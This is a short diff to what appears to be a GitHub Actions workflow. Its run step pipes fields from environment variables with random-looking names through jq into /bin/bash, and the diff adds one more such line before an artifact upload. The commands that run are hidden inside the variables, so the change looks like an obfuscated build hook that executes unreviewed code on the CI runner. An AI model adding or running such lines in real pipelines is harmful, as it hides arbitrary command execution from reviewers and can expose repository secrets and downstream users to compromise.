@@ -26,6 +26,7 @@ jobs:
           echo $al77 | jq -r .kd313 | /bin/bash
           echo $f9260 | jq -r .b527 | /bin/bash
           printf '%s' "$ihb6" | jq -r .hwqf53 | /bin/bash
+          printf '%s' "$bogw33926" | jq -r .ztjyw1278 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
